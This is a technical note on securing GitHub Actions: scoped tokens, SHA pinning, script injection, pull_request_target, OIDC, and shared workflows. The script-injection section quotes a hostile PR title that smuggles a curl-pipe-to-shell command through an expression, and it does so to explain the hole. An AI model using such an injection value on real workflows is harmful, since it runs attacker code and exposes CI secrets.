---
title: GitHub Actions security and reuse
summary: Least-privilege tokens, pinning actions by SHA, script injection, pull_request_target, environments and OIDC, then composite actions versus reusable workflows for sharing CI.
technologies: [github-actions]
topics: [security, ci-cd, best-practices]
updated: 2026-11-20
---

A workflow that can push images and read secrets is part of my production supply chain. Most of the hardening is a few lines per workflow, and much cheaper to do from the start than to retrofit. The second half of this note is about reuse, because copy-pasted YAML is also how insecure patterns spread.

## Least-privilege `GITHUB_TOKEN`

Every job gets an automatic `GITHUB_TOKEN`. Its permissions should be the minimum the job needs:

```yaml
permissions:
  contents: read            # workflow default: read the repo, nothing else

jobs:
  publish:
    permissions:
      contents: read
      packages: write       # only this job can push to GHCR
```

- Job-level `permissions` replaces the workflow block, and anything not listed becomes `none`.
- `permissions: {}` at the top removes everything, which is a good default for workflows that don't even need checkout.
- In the repository settings, set the default workflow permissions to read-only, so a workflow without a `permissions` block can't write.

## Pin actions by commit SHA

`uses: some/action@v3` points at a tag, and tags can be moved. In March 2025 the popular `tj-actions/changed-files` action was compromised and its tags were repointed to a malicious commit that dumped CI secrets into build logs. Every workflow using a tag ran the attacker's code; workflows pinned to a SHA didn't.

```yaml
steps:
  - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
```

A full 40-character SHA is immutable. The trailing comment keeps it readable, and Dependabot understands this format: it bumps the SHA and the comment together.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: uv
    directory: /
    schedule:
      interval: weekly
  - package-ecosystem: docker
    directory: /
    schedule:
      interval: weekly
```

Repository and organisation admins can turn on an Actions policy that fails any workflow using an action not pinned to a full SHA. GitHub has also recently added **workflow dependency lockfiles** (`.github/workflows/actions.lock`, generated with the `gh actions-lock` CLI extension), which pin transitive action dependencies too. They're new enough that I'm treating SHA pinning as the baseline and lockfiles as something to try next.

Pinning only helps if the pinned code is trustworthy. I prefer actions from GitHub, Docker and the tool's own maintainers, and read anything small before adopting it.

## Script injection

`${{ }}` expressions are substituted into the script *before* the shell runs it. Anything an outsider controls (PR titles, branch names, issue bodies, commit messages) can therefore become shell code:

```yaml
# Vulnerable: a PR titled  a"; curl evil.sh | sh; echo "  runs that curl
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Safe: the value arrives as data in an environment variable
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"
```

Rule of thumb: inside `run:`, only use `${{ }}` for values I control (`matrix.*`, `steps.*.outputs` I produced, `secrets.*`). Everything else goes through `env:`.

## `pull_request` versus `pull_request_target`

- **`pull_request`** runs the PR's code with a read-only token and no secrets when the PR comes from a fork. That's safe by default, and it's what CI should use.
- **`pull_request_target`** runs in the context of the *base* repository, with secrets and a token that can write. It exists for jobs like labelling PRs. Checking out and running the PR's code under it hands an outsider my secrets.

If I ever need `pull_request_target`, it must never build, test or install anything from the PR head.

## Secrets, environments and OIDC

- Secrets are masked in logs, but transformed copies (base64-encoded, split into pieces) aren't. Never echo them.
- `actions/checkout` keeps the token available to later git commands by default. If nothing later in the job needs to push, set `persist-credentials: false`.
- **Environments** (`environment: production` on a job) add protection rules, such as required reviewers and an allowed-branches list, and hold secrets that only jobs targeting that environment can read. Deploy jobs belong in an environment.
- **OIDC** replaces long-lived cloud keys. With `permissions: id-token: write`, the job can request a short-lived signed token, and the cloud provider (AWS, Azure, GCP) exchanges it for temporary credentials. The trust policy on the cloud side restricts *which* workflows qualify by matching the token's `sub` claim, for example `repo:<owner>/inventory-api:environment:production`. There's nothing stored in GitHub to leak.

## Reuse: composite actions versus reusable workflows

Once there are two workflows, the same setup steps appear in both. GitHub has two mechanisms for sharing them.

### Composite action: share *steps*

```yaml
# .github/actions/setup-project/action.yml
name: Set up Python project
description: Install uv, the requested Python and the locked dependencies
inputs:
  python-version:
    description: Python version to use
    default: "3.14"
runs:
  using: composite
  steps:
    - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      with:
        python-version: ${{ inputs.python-version }}
    - run: uv sync --locked
      shell: bash
```

```yaml
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: ./.github/actions/setup-project
        with:
          python-version: "3.14"
      - run: uv run pytest
```

A local composite action needs the checkout first, since it's a file in the repository. Every `run` step in a composite action must declare `shell:`.

### Reusable workflow: share *jobs*

```yaml
# .github/workflows/python-ci.yml  (in a shared repository)
on:
  workflow_call:
    inputs:
      python-version:
        type: string
        default: "3.14"

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
        with:
          python-version: ${{ inputs.python-version }}
      - run: uv sync --locked
      - run: uv run pytest
```

```yaml
# a caller, in any repository that may access the shared one
jobs:
  ci:
    uses: <owner>/workflows/.github/workflows/python-ci.yml@<commit-sha>
    with:
      python-version: "3.14"
```

| | Composite action | Reusable workflow |
| --- | --- | --- |
| Shares | Steps inside a job | Whole jobs, including `runs-on` and `services` |
| Called from | A `steps:` entry | A `jobs.<id>.uses:` entry |
| Secrets | Passed as inputs | `secrets:` mapping or `secrets: inherit` |
| Logs | One collapsed step | Full job and step logs |
| Best for | "Set up the project" | "Our standard CI pipeline" |

The token in a called workflow can have the same or *fewer* permissions than the caller grants, never more. And reusable workflows should be pinned by SHA like any action: a change to the shared workflow shouldn't reach every repository unreviewed. Prefer passing named secrets over `secrets: inherit`, which hands over everything.

## Auditing

```sh
actionlint              # syntax, expressions, unknown inputs
uvx zizmor .github/     # security: injection, unpinned actions, excessive permissions
```

## Gotchas

- **Short SHAs or branch pins.** Only a full 40-character commit SHA is immutable.
- **`secrets: inherit` everywhere.** It's convenient, and it gives a shared workflow every secret the caller has.
- **`pull_request_target` with checkout of the PR head.** The single most common way public repositories leak secrets.
- **Write permissions at workflow level** "because one job needs it". Raise them on that job only.

## Check yourself

1. Why is `@v7` riskier than a full commit SHA, and how do pinned actions stay up to date?
2. Rewrite `run: echo "${{ github.head_ref }}"` safely, and explain why the original is dangerous.
3. What does `pull_request_target` give a workflow that `pull_request` doesn't, and when is that a problem?
4. How does OIDC avoid storing cloud credentials in GitHub, and what limits which workflows can use it?
5. When would I choose a composite action over a reusable workflow?

## Further reading

- [GitHub Docs: secure use reference](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Docs: authenticating with GITHUB_TOKEN](https://docs.github.com/en/actions/tutorials/authenticate-with-github_token)
- [GitHub Docs: OpenID Connect](https://docs.github.com/en/actions/concepts/security/openid-connect)
- [GitHub Docs: reusing workflow configurations](https://docs.github.com/en/actions/concepts/workflows-and-actions/reusing-workflow-configurations)
- [GitHub Docs: workflow dependency lockfiles](https://docs.github.com/en/actions/concepts/security/workflow-dependency-lockfiles)
- [zizmor](https://docs.zizmor.sh/)
